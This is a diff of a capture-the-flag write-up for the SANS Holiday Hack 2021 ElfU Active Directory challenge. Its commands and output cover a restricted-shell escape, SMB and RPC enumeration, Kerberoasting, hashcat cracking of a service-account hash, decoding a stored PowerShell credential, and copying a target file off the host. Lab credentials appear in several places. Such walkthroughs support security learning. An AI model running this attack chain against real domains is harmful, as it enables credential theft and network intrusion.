@@ -25,10 +25,11 @@ ElfU Registration Portal
 New Student Domain Account Creation Successful!  You can now access the student
 network grading system by SSH'ing into this asset using the command below:
 
-ssh klgvjptkqc@grades.elfu.org -p 2222
+ssh psmifmgudo@grades.elfu.org -p 2222
 
-ElfU Domain Username: klgvjptkqc
-ElfU Domain Password: Hrtthvtul@
+ElfU Domain Username: psmifmgudo
+ElfU Domain Password: Bkexzxrqk@
+
 ```
 
 ```text
@@ -101,10 +102,6 @@ Eve Snowshoes:
 [chris-davis-talk]: https://www.youtube.com/watch?v=iMh8FTzepU4
 [kerberoasting]: https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
 
-
-
-
-
 [onetorulethemall]: https://github.com/NotSoSecure/password_cracking_rules
 [cewl]: https://github.com/digininja/CeWL
 [bloodhound]: https://github.com/BloodHoundAD/BloodHound
@@ -112,11 +109,15 @@ Eve Snowshoes:
 [methods]: https://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf
 
 Escape the grading system with Ctrl-D,
-then in Python spawn a shell:
+then in Python spawn a shell `import pty; pty.spawn("/bin/bash")`:
+
 ```python
 import pty
 pty.spawn('/bin/bash')
 ```
+
+In bash you can change the login shell to 'bash' with
+`chsh --shell /bin/bash psmifmgudo`
 
 As `nmap` is present, look for a potential DC:
 
@@ -132,29 +133,29 @@ PORT    STATE SERVICE
 $ $ smbclient -L 172.17.0.3
 Enter WORKGROUP\klgvjptkqc's password:
 
-	Sharename       Type      Comment
-	---------       ----      -------
-	netlogon        Disk
-	sysvol          Disk
-	elfu_svc_shr    Disk      elfu_svc_shr
-	research_dep    Disk      research_dep
-	IPC$            IPC       IPC Service (Samba 4.3.11-Ubuntu)
+  Sharename       Type      Comment
+  ---------       ----      -------
+  netlogon        Disk
+  sysvol          Disk
+  elfu_svc_shr    Disk      elfu_svc_shr
+  research_dep    Disk      research_dep
+  IPC$            IPC       IPC Service (Samba 4.3.11-Ubuntu)
 SMB1 disabled -- no workgroup available
 
 $ rpcclient -U klgvjptkqc 172.17.0.3
 Enter WORKGROUP\klgvjptkqc's password:
 $> querydominfo
-Domain:		ELFU
+Domain: ELFU
 Server:
 Comment:
-Total Users:	505
-Total Groups:	18
-Total Aliases:	33
+Total Users: 505
+Total Groups: 18
+Total Aliases: 33
 
 rpcclient $> getdompwinfo
 min_password_length: 7
 password_properties: 0x00000001
-	DOMAIN_PASSWORD_COMPLEX
+    DOMAIN_PASSWORD_COMPLEX
 
 $> enumdomgroups
 group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
@@ -177,7 +178,7 @@ group:[ResearchDepartment] rid:[0x454]
 group:[File Shares] rid:[0x5e7]
 ```
 
-```sh
+```shell
 $ /usr/local/bin/GetUserSPNs.py -outputfile spns.txt -dc-ip 172.17.0.3 ELFU/klgvjptkqc:'Hrtthvtul@' -request:who
 [-] list index out of range
 
@@ -194,14 +195,17 @@ ldap/elfu_svc.elfu.local/elfu        elfu_svc            2021-10-29 19:25:04.305
 ldap/elfu_svc.elfu.local/elfu.local  elfu_svc            2021-10-29 19:25:04.305279  2021-12-28 17:01:52.916386
 ```
 
-docker run -it --rm cewl  --verbose -o https://register.elfu.org > wordlist
+CeWL wordlist creation:
+`docker run -it --rm cewl  --verbose -o https://register.elfu.org > wordlist`
 
 ```sh
-$ hashcat  -m 13100 spns.txt  -r OneRuleToRuleThemAll.rule  --force -O wordlist.txt --show
-$krb5tgs$23$*elfu_svc$ELFU.LOCAL$ELFU.local/elfu_svc*$6aca036b36ec56aba....cd1d1fa62cc310a23f5f654aaa088d4aed59eac66584289b3dd8f971118125d2d2ad1f16b5011cc42909c0972f5d393f75470340ad3555279f3907c66720c8627b8594233b992cb3f8cd1a7cf0be6617ae42932b0a008174f9da160eb6fd94973154ff64f20271d5bba631f987c99ce161ba6e4117877245bc5ac24a69163bc0640b79f322df1c073532fa11992a580cf88a467a39525516792b4201fd7c18d8487f3126c28ebde374817384e82d34253e:Snow2021!
+$ hashcat  -m 13100 spns.txt  \
+        -r OneRuleToRuleThemAll.rule \
+        --force -O wordlist.txt --show
+$krb5tgs$23$*elfu_svc$ELFU.LOCAL$ELFU.local/elfu_svc*$6aca036b...cd1d1fa6d34253e:Snow2021!
 ```
 
-
+```sh
 smbclient  \\\\SHARE30\\elfu_svc_shr\\ -U elfu_svc
 Enter WORKGROUP\elfu_svc's password:
 Try "help" to get a list of possible commands.
@@ -216,8 +220,9 @@ $aPass = $SecStringPassword | ConvertTo-SecureString -Key 2,3,1,6,2,8,9,9,4,3,4,
 $ grep SecStringPassword *
 GetProcessInfo.ps1:$SecStringPassword = "76492....d111
 GetProcessInfo.ps1:$aPass = $SecStringPassword | ConvertTo-SecureString -Key 2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7
+```
 
-```pwsh
+```powershell
 $SecStringPassword = "76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADD
 IANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQQ
 A5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA"
@@ -226,18 +231,87 @@ $aCred = New-Object System.Management.Automation.PSCredential -ArgumentList ("el
 Invoke-Command -ComputerName 10.128.1.53 -ScriptBlock { Get-Process } -Credential $aCred -Authentication Negotiate
 ```
 
+Verify working / credentials are valid:
 
+```sh
 $ pwsh GetProcessInfo.ps1
 
- NPM(K)    PM(M)      WS(M)     CPU(s)      Id  SI ProcessName                                  PSComputerName
- ------    -----      -----     ------      --  -- -----------                                  --------------
-      9     4.31      10.10       0.00    3520   0 conhost                                      10.128.1.53
-     21     2.33       5.43       0.00     600   0 csrss                                        10.128.1.53
+ NPM(K)    PM(M)      WS(M)     CPU(s)      Id  SI ProcessName PSComputerName
+ ------    -----      -----     ------      --  -- ----------- --------------
+      9     4.31      10.10       0.00    3520   0 conhost     10.128.1.53
+     21     2.33       5.43       0.00     600   0 csrss       10.128.1.53
+```
 
+```pwsh
+[System.Net.NetworkCredential]::new("", $password).Password
+A1d655f7f5d98b10!
+```
 
-PS /home/klgvjptkqc> ConvertFrom-SecureString $aPass
-41003100640036003500350066003700660035006400390038006200310030002100
+**User:** `elfu.local\remote_elf` **Password:**  `A1d655f7f5d98b10!`
 
+```powershell
+PS C:\Users\remote_elf> Get-ADDomainController
 
+ComputerObjectDN           : CN=DC01,OU=Domain Controllers,DC=elfu,DC=local
+DefaultPartition           : DC=elfu,DC=local
+Domain                     : elfu.local
+Enabled                    : True
+Forest                     : elfu.local
+HostName                   : DC01.elfu.local
 
-SantaSecretToAWonderfulHolidaySeason.pdf
+```
+
+```powershell
+PS C:\Users\remote_elf> Get-ADPrincipalGroupMembership remote_elf
+
+distinguishedName : CN=Domain Users,CN=Users,DC=elfu,DC=local
+GroupCategory     : Security
+GroupScope        : Global
+name              : Domain Users
+objectClass       : group
+objectGUID        : ef709df5-a3b4-490f-b9a3-e31aff5e001a
+SamAccountName    : Domain Users
+SID               : S-1-5-21-2037236562-2033616742-1485113978-513
+
+distinguishedName : CN=Remote Management Users,CN=Builtin,DC=elfu,DC=local
+GroupCategory     : Security
+GroupScope        : DomainLocal
+name              : Remote Management Users
+objectClass       : group
+objectGUID        : 2bf02c64-912e-4269-adee-390138152f29
+SamAccountName    : Remote Management Users
+SID               : S-1-5-32-580
+
+distinguishedName : CN=Remote Management Domain Users,CN=Users,DC=elfu,DC=local
+GroupCategory     : Security
+GroupScope        : Global
+name              : Remote Management Domain Users
+objectClass       : group
+objectGUID        : 1b5a9193-120a-4c4c-aef4-61b008abed31
+SamAccountName    : RemoteManagementDomainUsers
+SID               : S-1-5-21-2037236562-2033616742-1485113978-1107
+```
+
+or
+
+```powershell
+PS C:\Users\remote_elf>  (New-Object System.DirectoryServices.DirectorySearcher("(&(objectCategory=User)(samAccountName=$($env:username)))")).FindOne().GetDirectoryEntry().memberOf
+CN=Remote Management Domain Users,CN=Users,DC=elfu,DC=local
+CN=Remote Management Users,CN=Builtin,DC=elfu,DC=local
+```
+
+```sh
+$ ping DC01.elfu.local
+PING DC01.elfu.local (10.128.1.53) 56(84) bytes of data.
+64 bytes from hhc21-windows-dc.c.holidayhack2021.internal (10.128.1.53): icmp_seq=1 ttl=127 time=0.969 ms
+64 bytes from hhc21-windows-dc.c.holidayhack2021.internal (10.128.1.53): icmp_seq=2 ttl=127 time=0.277 ms
+```
+
+```sh
+smbclient  \\\\SHARE30\\research_dep\\  -U 'elfu\psmifmgudo'
+Enter ELFU\psmifmgudo's password:
+```
+
+```sh
+scp -P 2222  psmifmgudo@grades.elfu.org:/home/psmifmgudo/SantaSecretToAWonderfulHolidaySeason.pdf .
+```
